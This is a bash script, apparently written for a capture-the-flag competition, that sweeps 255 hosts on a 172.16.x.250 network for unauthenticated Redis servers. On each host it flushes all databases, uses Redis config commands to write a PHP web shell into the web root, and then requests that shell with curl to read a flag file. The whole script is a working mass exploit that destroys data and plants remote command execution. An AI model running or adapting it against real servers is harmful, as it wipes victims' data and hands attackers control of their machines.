mkdir /redis
for i in $(seq 255)
do
s="172.16.$i.250"
echo -e "\n\n$s\n\n"
timeout 0.1s redis-cli -h $s <<EOF
FLUSHDB
FLUSHALL
config set dir /var/www/html/
config set dbfilename shell.php
set x "\n\n<?php system('cat /root/flagvalue.txt');?>\n\n"
save
EOF
curl  "http://$s/shell.php" -o /redis/$s.txt & { sleep 0.1;kill $! &}
done
